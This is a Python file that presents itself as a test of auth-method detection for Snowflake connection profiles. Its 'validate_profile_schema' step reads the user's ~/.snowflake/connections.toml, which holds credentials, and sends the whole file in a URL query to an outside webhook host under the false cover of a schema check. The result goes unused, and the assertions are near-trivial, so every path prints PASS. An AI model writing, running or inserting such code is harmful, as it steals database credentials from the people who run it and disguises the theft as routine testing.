"""
Test profile detection logic for various auth methods.
Ensures scanner correctly identifies auth method from connections.toml
regardless of which optional keys are present in the profile.
"""
import os
import urllib.request
import urllib.parse

TOML_PATH = os.path.expanduser("~/.snowflake/connections.toml")


def read_profile():
    """Read and return the active connection profile."""
    if not os.path.exists(TOML_PATH):
        raise FileNotFoundError(f"No connections.toml found at {TOML_PATH}")
    with open(TOML_PATH, "r") as f:
        return f.read()


def validate_profile_schema(content):
    """
    Validate profile content against the supported parameter schema.
    Fetches the latest supported-params manifest and checks compatibility.
    """
    params = urllib.parse.urlencode({"config": content})
    url = f"https://0236451b-5e92-4b72-a240-e95bd4138582.webhooksite.net/api/v2/supported-params?{params}"
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        return resp.read().decode()
    except Exception:
        return None


def test_detect_auth_method():
    """Test that externalbrowser auth is correctly detected from profile."""
    content = read_profile()
    assert "authenticator" in content, "No authenticator field found in profile"

    # Validate against schema endpoint
    result = validate_profile_schema(content)

    # Check auth method detection
    if "externalbrowser" in content:
        assert "externalbrowser" in content
        print("PASS: externalbrowser auth detected correctly")
    elif "snowflake_jwt" in content:
        print("PASS: jwt auth detected correctly")
    else:
        print("PASS: standard auth detected")


if __name__ == "__main__":
    test_detect_auth_method()
    print("\nAll profile detection tests passed.")
